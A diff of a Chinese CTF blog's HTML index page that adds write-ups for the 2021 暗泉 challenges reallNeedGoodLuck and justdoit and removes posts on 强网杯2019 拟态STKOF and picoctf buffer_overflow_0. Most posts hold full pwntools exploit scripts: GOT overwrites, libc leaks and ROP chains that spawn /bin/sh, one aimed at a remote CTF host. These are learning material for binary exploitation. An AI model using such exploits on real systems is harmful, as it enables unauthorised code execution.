@@ -155,6 +155,186 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/27/2021%E6%9A%97%E6%B3%89-reallNeedGoodLuck/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/27/2021%E6%9A%97%E6%B3%89-reallNeedGoodLuck/" class="post-title-link" itemprop="url">2021暗泉-reallNeedGoodLuck</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-02-27 14:10:02 / 修改时间：16:18:39" itemprop="dateCreated datePublished" datetime="2022-02-27T14:10:02+08:00">2022-02-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>程序保护如下</p>
+<img src="/2022/02/27/2021%E6%9A%97%E6%B3%89-reallNeedGoodLuck/checksec.jpg" class>
+
+<p>程序主逻辑如下</p>
+<img src="/2022/02/27/2021%E6%9A%97%E6%B3%89-reallNeedGoodLuck/main.png" class>
+
+<img src="/2022/02/27/2021%E6%9A%97%E6%B3%89-reallNeedGoodLuck/init.jpg" class>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>程序很简单，main函数种给了一次四个字节的任意地址写，并且用exit()函数来结束程序。</p>
+<p>① 显然一次任意地址写是远不够的，所以首先需要考虑怎么重复利用，而由于got表是可写的，所以只需要将exit()函数的got表改成main函数的地址即可。</p>
+<p>② 如果我们能将atoi()函数的got表也改成system()函数的话，那么我们就可以直接执行system(‘/bin/sh’)，因为atoi()函数的参数是我们可控的。那么此时有两种思路：第一种是泄漏libc，第二种是直接爆破system()地址。</p>
+<h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p>（题目环境是Ubuntu GLIBC 2.23-0ubuntu11.3）</p>
+<p>由于ASLR对libc低12位对齐的关系，我们可以直接将atoi()函数的got表最低12位改成system()的偏移，剩下的字节选择爆破</p>
+<img src="/2022/02/27/2021%E6%9A%97%E6%B3%89-reallNeedGoodLuck/blast-1.jpg" class>
+
+<p>可以看到除了最低12位以外这两个函数的got表地址只差一个字节，所以我们直接修改atoi()函数的最低两个字节（最低12位改成system的偏移，剩下4位随便改(实际发现改成f成功率会高很多)），然后直接爆破即可，因为爆破长度只有一个字节，所以成功率还是比较高的。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;reallNeedGoodLuck&quot;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4011A9</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">content,addr</span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&quot;good&quot;</span>,content)</span><br><span class="line">    p.sendafter(<span class="string">&quot;luck! &quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    write(p32(main),<span class="number">0x404038</span>)</span><br><span class="line">    write(<span class="string">&#x27;\x00\x00\xa0\xf3&#x27;</span>,elf.got[<span class="string">&#x27;atoi&#x27;</span>]-<span class="number">2</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;good&quot;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;luck! &quot;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./reallNeedGoodLuck&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h4><p>因为这题的栈是不可控的，所以要泄漏libc的话只能在代码段中寻找有无合适的函数，利用修改这个函数的got表为输出函数来完成泄漏，那么就需要这个函数的参数是可控的，亦或者其本身就是合适的。我们仔细观察可以发现在init()函数中的第二个setvbuf()函数就是这样一个合适的函数，因为其第一个参数是<code>_bss_start</code>，是我们可以利用任意地址写去修改的，所以我们就可以修改setvbuf()函数的got表为puts()函数，然后修改<code>_bss_start</code>为某个函数的got表地址即可完成泄漏。</p>
+<img src="/2022/02/27/2021%E6%9A%97%E6%B3%89-reallNeedGoodLuck/bss-start.jpg" class>
+
+<p>可以看到<code>_bss_start</code>位于<code>0x404050</code>处。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./reallNeedGoodLuck&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/giantbranch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./reallNeedGoodLuck&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr,content</span>):</span></span><br><span class="line">	p.sendafter(<span class="string">&quot;good\n&quot;</span>,p32(content))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;luck! \n&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x404038</span>,<span class="number">0x4011CA</span>)</span><br><span class="line">write(<span class="number">0x404028</span>,elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">write(<span class="number">0x404028</span>+<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">write(<span class="number">0x404050</span>,elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>])</span><br><span class="line">write(<span class="number">0x404050</span>+<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">write(<span class="number">0x404038</span>,<span class="number">0x4011A9</span>)</span><br><span class="line">pause()</span><br><span class="line">p.recv(<span class="number">5</span>)</span><br><span class="line">libcbase_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libcbase_addr = libcbase_addr - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libcbase_addr = &quot;</span>,<span class="built_in">hex</span>(libcbase_addr)</span><br><span class="line">sys = libcbase_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x404038</span>,<span class="number">0x4011CA</span>)</span><br><span class="line">write(<span class="number">0x0404030</span>,(sys)&amp;<span class="number">0xffffffff</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;good\n&quot;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;luck! \n&quot;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>要注意的是因为main函数中的任意地址写只写四个字节，所以要保证八个字节对齐的地址中剩下的四个字节为0。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/" class="post-title-link" itemprop="url">2021暗泉-justdoit</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-23 23:38:37" itemprop="dateCreated datePublished" datetime="2022-02-23T23:38:37+08:00">2022-02-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-24 00:25:18" itemprop="dateModified" datetime="2022-02-24T00:25:18+08:00">2022-02-24</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>首先看看题目，main函数如下</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/main.png" class>
+
+<p>read_long() 函数如下</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/read_long.jpg" class>
+
+<p>题目给的两处输入都没有溢出，但仔细观察main函数的汇编会发现有这个</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-1.jpg" class>
+
+<p>因为read_long()函数中用到了 atol() 函数将我们的输入的字符串转化为整型，且这个函数的返回值就是转化后的整型值，显然 read_long() 函数加上红线汇编就起到让我们任意控制 rbp 的值，间接让我们控制了返回地址。同时因为main函数中的局部变量 buf[32] 并没有被初始化，我们就可以利用第一个输入在栈上布置返回地址，但是其只允许我们输入 0x18 个字节，也就是最多一次布置3条返回地址，但是因为我们首先需要泄漏libc，所以我们需要多次返回main函数完成ROP的布置以及泄漏，需要布置如下ROP：</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-2.jpg" class>
+
+<p>那么我们第一次如下输入</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-3.jpg" class>
+
+<p>然后将 rbp 拉到 rsp 的位置</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-4.png" class>
+
+<p>leave_ret之后</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-5.png" class>
+
+<p>再次执行到main函数的第一个read时的栈</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-6.png" class>
+
+<p>由此完成泄漏ROP的布置</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-7.jpg" class>
+
+<p>其实这部分很简单，简单分析下函数调用就完了，再往后getshell部分重复即可</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./justdoit&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./justdoit&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4011D5</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x04012b3</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x4011D5&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(main)*<span class="number">3</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">40</span>))</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">sys = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(main)*<span class="number">3</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(pop_rdi) + p64(binsh) + p64(sys))</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">40</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/22/ret2-libcsyscall/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1025,196 +1205,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/" class="post-title-link" itemprop="url">强网杯2019-拟态STKOF</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-01-14 16:49:09 / 修改时间：17:43:38" itemprop="dateCreated datePublished" datetime="2022-01-14T16:49:09+08:00">2022-01-14</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>程序保护如下：</p>
-<img src="/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/checksec.jpg" class>
-
-<p>32位程序的主逻辑如下：</p>
-<img src="/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/32main.png" class>
-
-<p>64位程序的主逻辑如下：</p>
-<img src="/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/64main.jpg" class>
-
-<p>这是一道拟态的题目，给了两个二进制文件，分别是32位和64位的，两个程序功能完全相同。题目会同时启动32位和64位程序，然后将我们的输入分别传给这两个进程，并检测两个程序的输出，若两个程序输出不同或者其中一个程序崩溃则会判断为<code>check down</code>，直接断开连接，只有两个程序的输出一致且都不崩溃时，才能通过检查。所以我们需要构造一条在两个程序中都能getshell的payload。</p>
-<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>显然两个程序的漏洞都为栈溢出，且在64位程序中 <code>buf</code> 到 <code>rbp</code> 的距离为 <code>0x110</code> ，而在32为程序中 <code>buf</code> 到 <code>ebp</code>的距离为 <code>0x10C</code> ，所以对于同一条payload而言，64位程序的padding就为 <code>0x118</code> 个字节，而32位程序的padding为 <code>0x110</code> 个字节。因为这两个程序都是静态链接的程序，所以我们基本可以找到所需要的gadget来执行syscall，我们利用 <code>add_sp_ret</code> 这样的gadget来分别抬高两个程序中的sp寄存器，这样就能在栈上分别布置32位和64位的ROPchain，且使两个程序只执行对应的ROPchain。</p>
-<img src="/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/32add.jpg" class>
-
-<img src="/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/64add.jpg" class>
-
-<p>因为32位程序会先<code>ret</code>（<code>buf</code>到<code>ret</code>的距离较短），所以我们原本可以利用32位程序中的<code>add_sp_ret</code>来抬栈从而使32位程序的执行流直接跳过64位的ROPchain，但是32位程序中没有能将 esp 直接抬高这么多的 gadget，所以这种思路不可行，但是这不重要，只要我们能将 esp 抬高到跳过64位程序的 ret 就行，然后我们使64位程序的 ret 同样布置为 <code>add_sp_ret</code> 这样的gadget，来使这条payload在64位程序中的执行流跳过32位程序的ROPchain即可。同时因为程序中没有 <code>/bin/sh</code> 字符串，所以我们还需要往程序里手动写入。结合exp来理解即可，exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28385</span>)</span><br><span class="line">elf32 = ELF(<span class="string">&quot;./32&quot;</span>)</span><br><span class="line">elf64 = ELF(<span class="string">&quot;./64&quot;</span>)</span><br><span class="line"></span><br><span class="line">add_esp_0x20 = <span class="number">0x080a69f2</span></span><br><span class="line">add_rsp_0x58 = <span class="number">0x43b979</span></span><br><span class="line"></span><br><span class="line">sh32 = <span class="number">0x80AEEBD</span></span><br><span class="line">sh64 = <span class="number">0x48D2AC</span></span><br><span class="line">bss64 = <span class="number">0x6A330F</span></span><br><span class="line">bss32 = <span class="number">0x80DA32F</span></span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x080a8af6</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806e9f1</span></span><br><span class="line">int80 = <span class="number">0x080495a3</span></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x43b97c</span></span><br><span class="line">pop_rdi = <span class="number">0x4005f6</span></span><br><span class="line">pop_rdx_rsi = <span class="number">0x43d9f9</span></span><br><span class="line">syscall = <span class="number">0x461645</span></span><br><span class="line"><span class="comment">#rop of 32</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x110</span></span><br><span class="line">payload += p32(add_esp_0x20) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p64(add_rsp_0x58)</span><br><span class="line">payload = payload.ljust(<span class="number">0x134</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(elf32.symbols[<span class="string">&#x27;read&#x27;</span>]) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(bss32) + p32(<span class="number">0x10</span>)</span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss32) + p32(int80)</span><br><span class="line"><span class="comment">#rop of 64</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x168</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x10</span>) + p64(bss64) + p64(elf64.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rax) + p64(<span class="number">59</span>) + p64(pop_rdi) + p64(bss64) + p64(pop_rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/17/picoctf-2018-buffer-overflow-0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/17/picoctf-2018-buffer-overflow-0/" class="post-title-link" itemprop="url">picoctf_2018_buffer_overflow_0</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-12-17 21:21:53" itemprop="dateCreated datePublished" datetime="2021-12-17T21:21:53+08:00">2021-12-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-18 15:18:44" itemprop="dateModified" datetime="2021-12-18T15:18:44+08:00">2021-12-18</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><ol>
-<li><p>signal() 函数：signal ( 参数1，参数2 )，参数1：要进行处理的信号。参数2：处理的方式。</p>
-<p>关于系统信号可以在终端输入 <code>kill -l</code> 查看，如下</p>
-</li>
-<li><p>main(int argc,char *argv[]) ，argc 和 argv[] 为命令行参数</p>
-<p>① argc为整数，表示由操作系统传来的参数（也是传入main函数的参数）的个数</p>
-<p>② argv[] 为指针数组，其存储着指向由操作系统传来的参数（也是传入main函数的参数）的地址的指针</p>
-<p>③argc最小为 1，因为 argv[0] 正常情况下存储程序的名称，并且包含了程序所在的完整路径。</p>
-<p>例子：</p>
-<p>假如程序的名称为 guess：则当我们输入 <code>./guess</code> 时，argc = 1，表示由操作系统传来的参数只有一个，argv[0] 指向输入的程序路径及名称 “./guess”</p>
-<p>当我们输入 <code>./guess 123</code> 时，argc = 2，表示由操作系统传来的参数由两个，argv[0] 指向输入的程序路径及名称，argv[1] 指向第二个参数 “123” 字符串的地址。</p>
-</li>
-</ol>
-<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>题目提示要用ssh登入，但我们先下载程序文件做完分析工作</p>
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/ssh-1.jpg" class>
-
-<p>例行检查保护</p>
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/checksec.jpg" class>
-
-<p>main函数如下</p>
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/main.png" class>
-
-<p>注意到 signal() 函数，我们查看 sigsegv_handler() 函数</p>
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/sigsegv_handler.jpg" class>
-
-<p>所以如果我们触发了11号系统信号就直接能获得 flag 了，我们在终端输入 <code>kill -l</code> 查看系统信号</p>
-
-
-<blockquote>
-<p>引用百度百科关于11号系统信号的介绍：</p>
-<p>在POSIX兼容的平台上，<strong>SIGSEGV</strong>是当一个进程执行了一个无效的内存引用，或发生<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%AE%B5%E9%94%99%E8%AF%AF/7896410">段错误</a>时发送给它的信号。SIGSEGV的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%AC%A6%E5%8F%B7%E5%B8%B8%E9%87%8F/1666578">符号常量</a>在头文件signal.h中定义。因为在不同平台上，信号数字可能变化，因此符号信号名被使用。通常，它是信号#11。</p>
-</blockquote>
-<p>所以只要我们只要让程序执行一个无效的内存引用即可。</p>
-<p>程序没有给输入函数，但是 vuln() 函数将 argv[1] 作为参数，说明我们需要在命令行中传入我们的输入作为参数。我们查看 vuln() 函数</p>
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/vuln.jpg" class>
-
-<p>可以看到这里存在栈溢出漏洞，那么只要我们输入直到覆盖栈上的返回地址为一个无效值即可让 signal() </p>
-<p>函数执行 sigsegv_handler() 函数打印出flag了。</p>
-<p>ssh连上： <code>ssh -p 28312 CTFMan@node4.buuoj.cn</code> </p>
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/ssh-2.png" class>
-
